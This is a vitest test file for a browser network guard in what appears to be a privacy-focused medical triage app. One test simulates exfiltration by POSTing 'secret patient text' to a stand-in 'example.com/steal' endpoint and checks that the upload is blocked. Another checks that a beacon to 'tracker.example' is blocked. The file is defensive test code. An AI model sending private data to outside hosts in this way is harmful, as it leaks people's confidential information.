// PHASE1-POCKET
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { installNetworkGuard, getNetworkStats, resetNetworkStats, classifyUrl, allowHosts, bodySize } from '../utils/networkGuard';

describe('networkGuard', () => {
  let uninstall: () => void;
  let base: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    base = vi.fn().mockResolvedValue({ ok: true });
    (window as any).fetch = base;
    uninstall = installNetworkGuard();
    resetNetworkStats();
  });
  afterEach(() => uninstall());

  it('classifies origins', () => {
    expect(classifyUrl('/api/x', 'http://localhost:3000/')).toBe('same-origin');
    expect(classifyUrl('http://127.0.0.1:8000/h', 'http://localhost:3000/')).toBe('loopback');
    expect(classifyUrl('https://generativelanguage.googleapis.com/v1', 'http://localhost:3000/')).toBe('blocked');
    expect(classifyUrl('data:text/plain,hi', 'http://localhost:3000/')).toBe('same-origin');
  });

  it('blocks and counts a cross-origin fetch, and never reaches the network', async () => {
    await expect(fetch('https://example.com/steal', { method: 'POST', body: 'secret patient text' })).rejects.toThrow(/NETWORK_GUARD_BLOCKED/);
    const s = getNetworkStats();
    expect(s.blockedRequests).toBe(1);
    expect(s.blockedBytes).toBe('secret patient text'.length);
    expect(s.payloadBytesUploaded).toBe(0);
    expect(base).not.toHaveBeenCalled();
  });

  it('lets same-origin through and counts uploaded bytes only for writes', async () => {
    await fetch('/api/health');
    await fetch('/api/triage/alerts', { method: 'POST', body: 'abcd' });
    const s = getNetworkStats();
    expect(s.allowedRequests).toBe(2);
    expect(s.payloadBytesUploaded).toBe(4);
    expect(base).toHaveBeenCalledTimes(2);
  });

  it('allow-listed hosts pass but are counted separately', async () => {
    allowHosts(['huggingface.co']);
    await fetch('https://huggingface.co/model.bin');
    const s = getNetworkStats();
    expect(s.allowlistedRequests).toBe(1);
    expect(s.blockedRequests).toBe(0);
  });

  it('blocks sendBeacon to other origins', () => {
    (navigator as any).sendBeacon = vi.fn().mockReturnValue(true);
    uninstall();
    uninstall = installNetworkGuard();
    resetNetworkStats();
    expect(navigator.sendBeacon('https://tracker.example/b', 'x')).toBe(false);
    expect(getNetworkStats().blockedRequests).toBe(1);
  });

  it('bodySize handles common body types', () => {
    expect(bodySize('héllo')).toBe(6);
    expect(bodySize(new Blob(['abc']))).toBe(3);
    expect(bodySize(null)).toBe(0);
  });
});
